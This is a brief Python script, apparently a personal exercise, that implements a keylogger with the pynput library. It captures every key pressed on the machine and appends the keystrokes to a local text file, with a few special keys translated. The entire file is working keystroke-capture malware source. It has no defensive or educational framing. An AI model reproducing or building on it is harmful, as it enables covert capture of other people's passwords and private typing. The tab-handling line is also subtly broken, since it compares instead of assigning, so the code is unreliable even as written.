from pynput.keyboard import Listener
def keypress(key):
    key = str(key).replace("'","")

    if key == 'Key.space':
        key = " "
    if key == 'Key.enter':
        key = "\n"
    if key =='Key.shift_r' or key == 'Key.shift':
        key = "SHIFT"
    if key =='Key.tab':
        key == "\t"
    with open("key_logger.txt",'a') as f:
        f.write(key)

with Listener(on_press =keypress)as l:
    l.join()
#comment by brady 3/12/20
